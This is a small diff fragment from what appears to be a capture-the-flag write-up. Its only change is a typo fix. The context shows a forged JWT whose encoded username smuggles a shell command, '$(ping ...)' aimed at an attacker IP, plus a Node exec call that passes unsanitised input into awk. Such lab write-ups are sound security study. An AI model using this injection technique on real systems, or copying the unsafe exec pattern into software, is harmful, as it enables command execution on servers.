@@ -459,7 +459,7 @@ eyJ1c2VybmFtZSI6IiQocGluZyAtYyAzIDEwLjEwLjE0LjE1NCkiLCJpYXQiOjE2OTc4OTk2MzV9Cg==
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IiQocGluZyAtYyAzIDEwLjEwLjE0LjE1NCkiLCJpYXQiOjE2OTc4OTk2MzV9Cg.wMjUJXUna2mguO4bplntTtgX0GD8DBx6UlRtpzqvwwI
 ```
 
-Return the write up. I am an idiot and got carried away with not considering the bad characters again. Ippsec explain something I did not know about `awk` that it can also be used like a `grep`, because of this we can inject based off of terminating the `'/` with a `'`.
+Return the write up. I am an idiot and got carried away with not considering the bad characters again. Ippsec explained something I did not know about `awk` that it can also be used like a `grep`, because of this we can inject based off of terminating the `'/` with a `'`.
 
 ```js
 exec("awk '/" + user + "/' /var/www/private/leave_requests.csv" ...)
